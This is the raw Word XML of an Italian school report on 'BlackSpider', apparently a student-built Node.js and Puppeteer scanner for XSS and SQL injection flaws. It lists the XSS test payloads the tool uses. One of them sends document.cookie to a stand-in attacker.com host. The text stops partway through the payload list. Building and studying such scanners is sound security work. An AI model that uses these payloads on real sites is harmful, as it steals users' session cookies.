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004F5" w14:textId="7126D48C" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>BlackSpider</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="584B0B36" w14:textId="1B27BFD4" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Il programma </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>BlackSpider</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> rappresenta uno strumento che ho realizzato come parte del mio percorso scolastico, con l’obiettivo di approfondire le principali vulnerabilità delle applicazioni web e sviluppare un software in grado di rilevarle automaticamente. La mia applicazione si concentra principalmente su due tra gli attacchi più noti e pericolosi in ambito web: il </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Cross-Site Scripting (XSS)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> e le </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>SQL Injection</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>. Ho voluto creare un’interfaccia semplice e immediata, sia in modalità testuale che visuale, per consentire all’utente di effettuare scansioni di siti web e identificare eventuali punti deboli.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F9F926" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>La struttura del progetto si articola in due componenti fondamentali:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD7FB2C" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Backend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>, realizzato in Node.js nel file Server.js.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CBB50D" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Frontend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">, sviluppato con React nella cartella </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>components</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEDAD7B" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Quest’ultima raccoglie i moduli organizzati in base alla modalità di utilizzo: la sezione </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>CLI</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Command</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Line Interface) e la sezione </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>GUI</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Graphical</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> User Interface). Ho curato in particolare i file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2527E4" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>ControlloUrl.js e Check.js, che gestiscono la logica complessiva dell’applicazione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F78385C" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Server.js, che si occupa dell’avvio del server e della gestione delle richieste di scansione provenienti dal </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>frontend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3216F5CB" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">La parte </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>CLI</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> comprende componenti come:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E03474" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>VecchiOutputs.js, che mostra i vecchi messaggi a schermo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75491975" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Scan.js, che mostra all’utente i risultati della scansione tramite comandi testuali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10629D1C" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">La parte </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Visuale</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> si basa su moduli come:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3231FB89" w14:textId="52C50E4C" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Check.js, per </w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>avviare</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> la scansione vera e propria.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428B91BC" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Results.js, che presenta i risultati in una forma più intuitiva e graficamente curata.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F62A066" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Il sistema di scansione che ho sviluppato si basa su una combinazione di tecnologie moderne per offrire un'analisi completa e precisa delle vulnerabilità, sia lato server sia lato client. Per la parte </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">, utilizzo </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Node.js </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>con il framework</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Express</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">, mentre per l'automazione del browser ho scelto </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Puppeteer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">, una libreria che consente di controllare un browser reale (come Chrome o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Chromium</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>) in modo programmato.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B077B9" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">L'architettura così costruita offre un notevole vantaggio: la capacità di eseguire test che vanno oltre le semplici richieste HTTP statiche, tipiche di scanner tradizionali. In questo modo, il sistema riesce a individuare vulnerabilità che potrebbero sfuggire a strumenti </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>meno sofisticati, come i riflessi JavaScript attivati solo in condizioni dinamiche o query SQL che reagiscono diversamente a input complessi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383629CD" w14:textId="4734891A" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Attacchi Cross-Site Scripting (XSS)</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Il sistema effettua diversi tipi di attacchi XSS, per verificare la resistenza delle applicazioni web contro iniezioni di codice JavaScript.</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">1.1 XSS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>basato</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>su</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;script&gt; (Script Injection)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EE5E70" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>I payload di questa tipologia sfruttano direttamente il tag &lt;script&gt;, inserendo codice JavaScript che viene eseguito nel browser della vittima. Ad esempio:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A9B4AC" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Payload Base</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6D9881" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>document.body.innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> += '&lt;div id="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>-ok"&gt;XSS ESEGUITO&lt;/div&gt;'&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D806521" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Questo codice aggiunge un elemento nel DOM come segnale visivo dell'avvenuta esecuzione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B47BC8" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Furto di Cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C8E8F9" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&lt;script&gt;console.log(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>);&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9E9C7B" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Serve a dimostrare che il codice JavaScript ha accesso ai cookie della sessione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E5F6A0" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Esfiltrazione di dati</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="057E77E6" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73150E70" w14:textId="75D3BC97" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
